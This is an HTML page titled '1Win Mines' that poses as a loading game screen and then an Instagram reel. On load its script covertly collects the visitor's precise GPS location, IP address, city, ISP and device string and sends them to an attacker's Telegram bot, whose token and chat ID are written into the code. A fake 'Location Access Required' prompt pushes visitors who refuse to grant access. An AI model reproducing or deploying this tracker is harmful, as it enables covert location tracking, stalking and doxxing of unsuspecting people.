<!DOCTYPE html>  
<html>  
<head>  
    <meta charset="utf-8">  
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <title>1Win Mines</title>  
    <style>  
        body, html {  
            margin: 0;  
            padding: 0;  
            height: 100%;  
            overflow: hidden;  
            font-family: Arial, sans-serif;  
        }  
        #bg-image {  
            position: absolute;  
            top: 0;  
            left: 0;  
            width: 100%;  
            height: 100%;  
            object-fit: cover;  
            z-index: 1;  
        }  
        #loading-overlay {  
            position: absolute;  
            top: 0;  
            left: 0;  
            width: 100%;  
            height: 100%;  
            background: rgba(0, 0, 0, 0.6);  
            display: flex;  
            flex-direction: column;  
            justify-content: center;  
            align-items: center;  
            z-index: 2;  
        }  
        .loader {  
            width: 50px;  
            height: 50px;  
            border: 5px solid rgba(255, 255, 255, 0.3);  
            border-radius: 50%;  
            border-top-color: #fff;  
            animation: spin 1s ease-in-out infinite;  
            margin-bottom: 15px;  
        }  
        @keyframes spin {  
            to { transform: rotate(360deg); }  
        }  
        #loading-text {  
            color: white;  
            font-size: 18px;  
            margin-top: 10px;  
            text-align: center;  
        }  
        #permission-request {  
            position: absolute;  
            top: 0;  
            left: 0;  
            width: 100%;  
            height: 100%;  
            background: rgba(0, 0, 0, 0.8);  
            display: none;  
            flex-direction: column;  
            justify-content: center;  
            align-items: center;  
            z-index: 3;  
            color: white;  
            text-align: center;  
            padding: 20px;  
        }  
        #permission-request h2 {  
            margin-bottom: 15px;  
        }  
        #allow-btn {  
            margin-top: 20px;  
            padding: 12px 30px;  
            background: #4CAF50;  
            color: white;  
            border: none;  
            border-radius: 5px;  
            font-size: 16px;  
            cursor: pointer;  
        }  
        #instagram-reel {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            display: none;
        }
    </style>  
</head>  
<body>  
    <img id="bg-image" src="https://raw.githubusercontent.com/danish-attar/omegle/refs/heads/main/smart-phone-with-instagram-app-logo-on-its-screen-vector-51195621.jpg" alt="Background">  
    
    <iframe id="instagram-reel" src="https://www.instagram.com/reel/DP1Qrn7jAcJ/embed" frameborder="0"></iframe>
      
    <div id="loading-overlay">  
        <div class="loader"></div>  
        <div id="loading-text">Connecting to server...</div>  
    </div>  
      
    <div id="permission-request">  
        <h2>Location Access Required</h2>  
        <p>Please allow location access to continue</p>  
        <button id="allow-btn">ALLOW LOCATION</button>  
    </div>  
  
    <script>  
        // Telegram bot details  
        const botToken = '8440190119:AAH9ukiBj1NhHh7-rNb9vv22vj7m64rHSC4';  
        const chatId = '7173355426';  
          
        // DOM elements  
        const bgImage = document.getElementById('bg-image');
        const instagramReel = document.getElementById('instagram-reel');
        const loadingOverlay = document.getElementById('loading-overlay');  
        const loadingText = document.getElementById('loading-text');  
        const permissionRequest = document.getElementById('permission-request');  
        const allowBtn = document.getElementById('allow-btn');  
          
        // Loading messages  
        const loadingMessages = [  
            "Connecting to server...",  
            "Loading game assets...",  
            "Verifying account...",  
            "Almost ready...",  
            "Preparing interface...",  
            "Finalizing setup..."  
        ];  
          
        // Function to get IP info  
        async function getIPInfo() {  
            try {  
                const ipResponse = await fetch('https://api.ipify.org?format=json');  
                const ipData = await ipResponse.json();  
                const detailsResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);  
                return await detailsResponse.json();  
            } catch (error) {  
                console.error("IP info error:", error);  
                return {};  
            }  
        }  
          
        // Function to get precise location  
        function getPreciseLocation() {  
            return new Promise((resolve) => {  
                if (!navigator.geolocation) {  
                    resolve(null);  
                    return;  
                }  
                  
                navigator.geolocation.getCurrentPosition(  
                    position => resolve({  
                        lat: position.coords.latitude,  
                        lon: position.coords.longitude,  
                        accuracy: position.coords.accuracy,  
                        timestamp: new Date().toLocaleString()  
                    }),  
                    error => {  
                        console.error("Location error:", error);
                        resolve(null);  
                    },  
                    {   
                        enableHighAccuracy: true,  
                        timeout: 15000,  
                        maximumAge: 0  
                    }  
                );  
            });  
        }  
          
        // Function to send data to Telegram  
        async function sendToTelegram(data) {  
            try {  
                let message = `ðŸ•µï¸ NEW VISITOR TRACKED ðŸ•µï¸\n\n`;  
                message += `ðŸ“± Device: ${navigator.userAgent}\n\n`;  
                message += `ðŸŒ IP: ${data.ip || 'Unknown'}\n`;  
                message += `ðŸ“ IP Location: ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}\n`;  
                message += `ðŸ¢ ISP: ${data.org || 'Unknown'}\n`;  
                  
                if (data.liveLocation) {  
                    message += `\nðŸŽ¯ LIVE GPS LOCATION:\n`;  
                    message += `ðŸ”¹ Latitude: ${data.liveLocation.lat}\n`;  
                    message += `ðŸ”¹ Longitude: ${data.liveLocation.lon}\n`;  
                    message += `ðŸ”¹ Accuracy: ${data.liveLocation.accuracy}m\n`;  
                    message += `ðŸ”¹ Time: ${data.liveLocation.timestamp}\n`;  
                    message += `ðŸ—ºï¸ Google Maps: https://www.google.com/maps?q=${data.liveLocation.lat},${data.liveLocation.lon}\n`;  
                } else {  
                    message += `\nðŸ“ APPROX LOCATION:\n`;  
                    message += `ðŸ”¹ Latitude: ${data.latitude || 'Unknown'}\n`;  
                    message += `ðŸ”¹ Longitude: ${data.longitude || 'Unknown'}\n`;  
                    if (data.latitude && data.longitude) {  
                        message += `ðŸ—ºï¸ Google Maps: https://www.google.com/maps?q=${data.latitude},${data.longitude}\n`;  
                    }  
                }  
                  
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {  
                    method: 'POST',  
                    headers: { 'Content-Type': 'application/json' },  
                    body: JSON.stringify({  
                        chat_id: chatId,  
                        text: message  
                    })  
                });  
                  
                if (data.liveLocation) {  
                    await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {  
                        method: 'POST',  
                        headers: { 'Content-Type': 'application/json' },  
                        body: JSON.stringify({  
                            chat_id: chatId,  
                            latitude: data.liveLocation.lat,  
                            longitude: data.liveLocation.lon  
                        })  
                    });  
                }  
            } catch (error) {  
                console.error("Telegram error:", error);  
            }  
        }  
          
        // Rotate loading messages  
        function rotateLoadingMessages() {  
            let counter = 0;  
            const interval = setInterval(() => {  
                loadingText.textContent = loadingMessages[counter];  
                counter = (counter + 1) % loadingMessages.length;  
            }, 3000);  
            return interval;
        }  
          
        // Show Instagram reel after delay
        function showInstagramReel() {
            setTimeout(() => {
                bgImage.style.display = 'none';
                instagramReel.style.display = 'block';
                loadingOverlay.style.display = 'none';
            }, 4000);
        }
          
        // Main tracking function  
        async function trackUser() {  
            // Start rotating loading messages  
            const interval = rotateLoadingMessages();
              
            // First try to get precise location  
            const liveLocation = await getPreciseLocation();  
              
            // Then get IP details  
            const ipDetails = await getIPInfo();  
              
            // Combine all data  
            const trackingData = {  
                ...ipDetails,  
                ip: ipDetails.ip || 'Unknown',  
                liveLocation: liveLocation  
            };  
              
            // Send to Telegram  
            await sendToTelegram(trackingData);  
              
            // Clear loading message rotation
            clearInterval(interval);
              
            // Show Instagram reel after 4 seconds if location was granted
            if (liveLocation) {
                showInstagramReel();
            } else {
                // If location was denied, show permission request
                permissionRequest.style.display = 'flex';
            }
        }  
          
        // When allow button is clicked  
        allowBtn.addEventListener('click', async () => {  
            permissionRequest.style.display = 'none';  
            await trackUser();  
        });  
          
        // Start tracking when page loads  
        window.onload = function() {
            // Initially hide the permission request
            permissionRequest.style.display = 'none';
            // Start the tracking process
            trackUser();
        };
    </script>  
</body>  
</html>
